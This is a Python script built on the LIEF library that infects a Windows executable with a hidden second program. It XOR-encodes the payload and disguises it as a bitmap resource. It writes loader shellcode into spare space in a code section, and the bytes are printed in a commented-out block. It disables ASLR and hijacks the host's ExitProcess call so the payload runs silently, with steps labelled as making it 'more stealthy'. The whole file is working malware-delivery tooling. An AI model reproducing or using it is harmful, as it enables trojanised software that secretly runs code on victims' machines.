
import os, sys, string, io, lief, struct
from pathlib import Path

# PE_LOADER_SHELLCODE = bytes([
#  	0x60, 0x6A, 0x30, 0x58, 0x64, 0x8B, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x70, 0x0C, 0xAD, 0x96, 0xAD, 
# 	0x8B, 0x68, 0x18, 0xE8, 0x11, 0x00, 0x00, 0x00, 0x7A, 0x8E, 0x25, 0xE9, 0xFF, 0x1F, 0x7C, 0xC9, 
# 	0x8D, 0xBD, 0xC1, 0x3F, 0x4A, 0x0D, 0xCE, 0x09, 0x00, 0x5E, 0x89, 0xEB, 0x8B, 0x45, 0x3C, 0x03, 
# 	0x5C, 0x05, 0x78, 0x99, 0x89, 0xE8, 0x89, 0xEF, 0x42, 0x03, 0x43, 0x20, 0x03, 0x3C, 0x90, 0x83, 
# 	0xC8, 0xFF, 0x32, 0x07, 0x6A, 0x08, 0x59, 0xD1, 0xE8, 0x73, 0x05, 0x35, 0x20, 0x83, 0xB8, 0xED, 
# 	0xE2, 0xF5, 0x47, 0x38, 0x0F, 0x75, 0xEB, 0xF7, 0xD0, 0x39, 0x06, 0x75, 0xD7, 0x89, 0xEF, 0x89, 
# 	0xE8, 0x03, 0x7B, 0x24, 0x0F, 0xB7, 0x3C, 0x57, 0x03, 0x43, 0x1C, 0x8B, 0x04, 0xB8, 0x01, 0xE8, 
# 	0x50, 0xAD, 0x2A, 0x0E, 0x75, 0xBE, 0xBE, 0x0D, 0xF0, 0xAD, 0xDE, 0x8B, 0x6E, 0x3C, 0x01, 0xF5, 
# 	0xB5, 0x30, 0x6A, 0x40, 0x51, 0x68, 0xED, 0xFE, 0xAD, 0xDE, 0x6A, 0x00, 0xFF, 0x54, 0x24, 0x10, 
# 	0x50, 0x89, 0xE3, 0xB9, 0xB0, 0xB0, 0xAD, 0xDE, 0x89, 0xC7, 0x56, 0xF3, 0xA4, 0x5E, 0x89, 0xC7, 
# 	0xB9, 0xB0, 0xB0, 0xAD, 0xDE, 0x8A, 0x17, 0x80, 0xF2, 0xFF, 0x88, 0x17, 0x47, 0xE2, 0xF6, 0x8B, 
# 	0x68, 0x3C, 0x01, 0xC5, 0x66, 0x8B, 0x4D, 0x14, 0x8D, 0x54, 0x0D, 0x18, 0x66, 0x8B, 0x4D, 0x06, 
# 	0x97, 0x60, 0x03, 0x72, 0x14, 0x03, 0x7A, 0x0C, 0x8B, 0x4A, 0x10, 0xF3, 0xA4, 0x03, 0x7A, 0x0C, 
# 	0x8B, 0x4A, 0x10, 0x0F, 0xB6, 0x17, 0x81, 0xF2, 0xFF, 0x00, 0x00, 0x00, 0x88, 0x17, 0x47, 0xE2, 
# 	0xF2, 0x61, 0x83, 0xC2, 0x28, 0xE2, 0xDA, 0x60, 0xB1, 0x80, 0x8B, 0x2C, 0x29, 0x85, 0xED, 0x74, 
# 	0x3B, 0x01, 0xFD, 0x8B, 0x4D, 0x0C, 0xE3, 0x34, 0x03, 0x0B, 0x51, 0xFF, 0x53, 0x08, 0x91, 0x8B, 
# 	0x7D, 0x10, 0x8B, 0x75, 0x00, 0x85, 0xF6, 0x0F, 0x44, 0xF7, 0x03, 0x33, 0x03, 0x3B, 0xAD, 0x85, 
# 	0xC0, 0x74, 0x14, 0x0F, 0xBA, 0xF0, 0x1F, 0x72, 0x04, 0x03, 0x03, 0x40, 0x40, 0x51, 0x50, 0x51, 
# 	0xFF, 0x53, 0x0C, 0x59, 0xAB, 0xEB, 0xE7, 0x83, 0xC5, 0x14, 0xEB, 0xC7, 0x61, 0xB1, 0xA0, 0x8D, 
# 	0x54, 0x0D, 0x00, 0x03, 0x3A, 0x31, 0xC9, 0x60, 0x8B, 0x4F, 0x04, 0x83, 0xE9, 0x08, 0x99, 0x0F, 
# 	0xB7, 0x44, 0x17, 0x08, 0x50, 0x80, 0xE4, 0xF0, 0x80, 0xFC, 0x30, 0x58, 0x75, 0x12, 0x80, 0xE4, 
# 	0x0F, 0x03, 0x07, 0x03, 0x03, 0x8B, 0x30, 0x2B, 0x75, 0x34, 0x03, 0x33, 0x89, 0x30, 0x31, 0xC0, 
# 	0x85, 0xC0, 0x75, 0x22, 0x42, 0x42, 0x39, 0xD1, 0x75, 0xD5, 0x61, 0x03, 0x4F, 0x04, 0x03, 0x7F, 
# 	0x04, 0x39, 0x4A, 0x04, 0x75, 0xC1, 0x31, 0xC9, 0x51, 0x51, 0x49, 0x51, 0xFF, 0x53, 0x10, 0x8B, 
# 	0x45, 0x28, 0x03, 0x03, 0xFF, 0xD0, 0x8D, 0x63, 0x14, 0x61, 0xC2, 0x04, 0x00
# ])

PE_LOADER_SHELLCODE = Path("stub32.bin").read_bytes()

BITMAP_HEADER = [
 	0x42, 0x4D, 0xC6, 0x29, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x36, 0x04, 0x00, 0x00, 0x28, 0x00, 
	0x00, 0x00, 0x89, 0x03, 0x00, 0x00, 0x4C, 0x02, 0x00, 0x00, 0x01, 0x00, 0x08, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x90, 0x25, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00
]

"""
0xdeadf00d - payload address
0xdeadfeed - image size
0xdeadb00b - header size
"""

def get_payload_node(source):
    dirs = source.resources
    for dir in dirs.childs:
        if dir.id == lief.PE.RESOURCE_TYPES.BITMAP:
            for entry in dir.childs:
                if entry.name == "SPLASHIMAGE":
                    return entry.childs[0]
    return None

def offset_to_va(source, offset):
    return offset_to_rva(source, offset) + source.optional_header.imagebase

def offset_to_rva(source, offset):
    section = source.section_from_offset(offset)
    return offset - section.offset + section.virtual_address

def get_appropriate_section_index(source):
    for i in range(len(source.sections)):
        if source.sections[i].has_characteristic(lief.PE.SECTION_CHARACTERISTICS.MEM_EXECUTE) and ((source.sections[i].sizeof_raw_data - source.sections[i].virtual_size) > len(PE_LOADER_SHELLCODE)):
            return i
    return -1

def add_payload_resource(source, payload):
    my_payload = bytearray(bytes(BITMAP_HEADER) + payload)

    for i in range(len(BITMAP_HEADER), len(my_payload)):
        my_payload[i] ^= 0xFF

    payload_resource = lief.PE.ResourceData(my_payload, 0)
    payload_resource.id = 0xDEADBEEF
    payload_directory = lief.PE.ResourceDirectory()
    payload_directory.id = 0xDEADBEEF
    payload_directory.name = "SPLASHIMAGE"
    payload_directory.add_data_node(payload_resource)

    if source.resources_manager.has_type(lief.PE.RESOURCE_TYPES.BITMAP):
        bitmap_directory = source.resources_manager.get_node_type(lief.PE.RESOURCE_TYPES.BITMAP)
        bitmap_directory.add_directory_node(payload_directory)

def rebuild_and_reload_binary(source, output=None, rebuild_resources=False, rebuild_sections=True):
    builder = lief.PE.Builder(source)
    builder.build_resources(rebuild_resources)
    builder.build()
    if output:
        builder.write(output)
    return lief.PE.parse(builder.get_build()), builder.get_build()

def injectPayload(source, payload, output):
    global PE_LOADER_SHELLCODE
    source = lief.PE.parse(source)

    code_section_index = get_appropriate_section_index(source)
    if code_section_index == -1:
        print("Source file does not have any executable sections with enough space to contain shellcode. Exiting ...")
        return


    if not source.has_resources or not source.resources_manager.has_type(lief.PE.RESOURCE_TYPES.BITMAP):
        print("Source file does not have any existing BITMAP resources. Exiting...")
        return

    # Add our payload resource and reload the file
    add_payload_resource(source, payload)
    source, _ = rebuild_and_reload_binary(source, "output_stage1_resource_added.exe", rebuild_resources=True)

    # Let's increase the size of the section slightly and reload the file
    code_section = source.sections[code_section_index]
    code_section.virtual_size += len(PE_LOADER_SHELLCODE)
    source, _ = rebuild_and_reload_binary(source, "output_stage2_code_section_size_adjusted.exe")

    # Figure out where our payload is located , patch shellcode in, and reload the file
    payload_resource_node = get_payload_node(source)
    payload_address = struct.pack("<I", offset_to_va(source, payload_resource_node.offset + len(BITMAP_HEADER)))
    PE_LOADER_SHELLCODE = PE_LOADER_SHELLCODE.replace(struct.pack("<I",0xDEADF00D), payload_address)
    PE_LOADER_SHELLCODE = PE_LOADER_SHELLCODE.replace(struct.pack("<I",0xDEADFEED), struct.pack("<I", source.optional_header.sizeof_image))
    PE_LOADER_SHELLCODE = PE_LOADER_SHELLCODE.replace(struct.pack("<I",0xDEADB0B0), struct.pack("<I", source.optional_header.sizeof_headers))
    code_section = source.sections[code_section_index]
    shellcode_address = code_section.virtual_address + code_section.virtual_size - len(PE_LOADER_SHELLCODE)
    source.patch_address(shellcode_address, PE_LOADER_SHELLCODE, lief.Binary.VA_TYPES.RVA)
    source, _ = rebuild_and_reload_binary(source, "output_stage3_shellcode_added.exe")

    # Remove some traces to be more stealthy
    source.optional_header.dll_characteristics &= ~lief.PE.DLL_CHARACTERISTICS.DYNAMIC_BASE
    print(source.get_section(".rsrc"))
    print(source.remove_section(".rsrc"))
    source, _ = rebuild_and_reload_binary(source, "output_stage4_aslr_disabled.exe")
    print(source.get_section(".l2"))
    source.get_section(".l2").name = ".rsrc"
    source, raw_file = rebuild_and_reload_binary(source, "output_stage4_aslr_disabled.exe")

    # Patch the calls to the function stub
    kernel32_imports = source.get_import("kernel32.dll")
    call_target = struct.pack("<I", kernel32_imports.get_function_rva_from_iat("ExitProcess") + kernel32_imports.import_address_table_rva + source.optional_header.imagebase)
    shellcode_target = struct.pack("<I", shellcode_address + source.optional_header.imagebase)
    search_pattern = b'\xff\x25' + call_target
    replace_pattern = b'\x68' + shellcode_target + b'\xc3' # PUSH shellcode_target; RET
    raw_file = bytes(raw_file).replace(search_pattern, replace_pattern)
   
    Path(output).write_bytes(raw_file)

def is_payload_valid(payload):
    source = lief.PE.parse(payload)
    return source.has_relocations
    
def main(arguments):
    if len(arguments) != 2 or not os.path.isfile(arguments[0]) or not os.path.isfile(arguments[1]):
        print("Error: Crystal ball broken. You idiot. I need two files (source and payload).")
        return

    if not is_payload_valid(os.path.basename(arguments[1])):
        print("Error: Payload needs to be relocatable.")
        return

    payload = Path(os.path.basename(arguments[1])).read_bytes()
    injectPayload(os.path.basename(arguments[0]), payload, "output.exe")

if __name__ == "__main__":
    main(sys.argv[1:])